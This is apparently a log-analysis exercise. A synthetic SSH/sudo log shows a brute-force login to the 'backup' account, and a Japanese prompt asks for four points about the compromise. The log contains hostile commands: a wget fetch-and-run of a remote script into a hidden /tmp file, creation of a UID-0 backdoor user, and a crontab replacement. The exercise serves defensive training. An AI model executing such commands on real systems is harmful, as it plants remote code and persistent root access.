@@ -1,0 +1,39 @@
+```
+Oct 12 00:00:01 web01 sshd[42905]: Failed password for root from 203.0.113.45 port 43648 ssh2
+Oct 12 00:00:02 web01 sshd[2639]: Failed password for root from 203.0.113.45 port 64299 ssh2
+Oct 12 00:00:04 web01 sshd[19024]: Failed password for root from 203.0.113.45 port 48024 ssh2
+Oct 12 00:00:05 web01 sshd[15628]: Failed password for root from 203.0.113.45 port 44572 ssh2
+Oct 12 00:00:07 web01 sshd[49265]: Failed password for root from 203.0.113.45 port 43358 ssh2
+Oct 12 00:00:09 web01 sshd[45348]: Failed password for root from 203.0.113.45 port 64270 ssh2
+Oct 12 00:00:12 web01 sshd[59469]: Failed password for root from 203.0.113.45 port 57870 ssh2
+Oct 12 00:00:14 web01 sshd[6697]: Failed password for root from 203.0.113.45 port 59349 ssh2
+Oct 12 00:00:15 web01 sshd[28651]: Failed password for root from 203.0.113.45 port 41041 ssh2
+Oct 12 00:00:18 web01 sshd[2952]: Failed password for root from 203.0.113.45 port 43070 ssh2
+Oct 12 00:00:20 web01 sshd[15328]: Failed password for root from 203.0.113.45 port 47623 ssh2
+Oct 12 00:00:23 web01 sshd[34118]: Failed password for root from 203.0.113.45 port 59726 ssh2
+Oct 12 00:00:24 web01 sshd[2739]: Failed password for root from 203.0.113.45 port 58390 ssh2
+Oct 12 00:00:26 web01 sshd[14031]: Failed password for root from 203.0.113.45 port 63462 ssh2
+Oct 12 00:00:27 web01 sshd[43590]: Failed password for root from 203.0.113.45 port 62981 ssh2
+Oct 12 00:00:30 web01 sshd[36713]: Failed password for root from 203.0.113.45 port 53746 ssh2
+Oct 12 00:00:32 web01 sshd[15446]: Failed password for root from 203.0.113.45 port 54719 ssh2
+Oct 12 00:00:35 web01 sshd[39618]: Failed password for root from 203.0.113.45 port 49115 ssh2
+Oct 12 00:00:38 web01 sshd[54046]: Failed password for root from 203.0.113.45 port 40212 ssh2
+Oct 12 00:00:40 web01 sshd[50729]: Failed password for root from 203.0.113.45 port 45231 ssh2
+Oct 12 00:00:43 web01 sshd[46753]: Failed password for backup from 203.0.113.45 port 53848 ssh2
+Oct 12 00:00:44 web01 sshd[23298]: Failed password for backup from 203.0.113.45 port 49105 ssh2
+Oct 12 00:00:47 web01 sshd[11189]: Failed password for backup from 203.0.113.45 port 47055 ssh2
+Oct 12 00:00:48 web01 sshd[63731]: Failed password for backup from 203.0.113.45 port 51029 ssh2
+Oct 12 00:00:49 web01 sshd[48211]: Accepted password for backup from 203.0.113.45 port 51122 ssh2
+Oct 12 00:00:52 web01 sshd[48211]: pam_unix(sshd:session): session opened for user backup(uid=1003) by (uid=0)
+Oct 12 00:00:53 web01 sudo:   backup : TTY=pts/1 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/wget -q http://198.51.100.23/upd.sh -O /tmp/.upd.sh
+Oct 12 00:00:55 web01 sudo:   backup : TTY=pts/1 ; PWD=/home/backup ; USER=root ; COMMAND=/bin/bash /tmp/.upd.sh
+Oct 12 00:00:56 web01 useradd[48302]: new user: name=sysupd, UID=0, GID=0, home=/root, shell=/bin/bash
+Oct 12 00:00:57 web01 crontab[48317]: (root) REPLACE (root)
+Oct 12 00:00:58 web01 sshd[48211]: Disconnected from user backup 203.0.113.45 port 51122
+```
+
+上記は Linux サーバー web01 のログです。このログを分析し、次の4点を日本語の箇条書き（各1行、計4行）で答えてください。
+(1) 侵害の有無
+(2) 攻撃元の IP アドレス
+(3) 侵入に成功した時刻
+(4) 侵入後の不審な操作
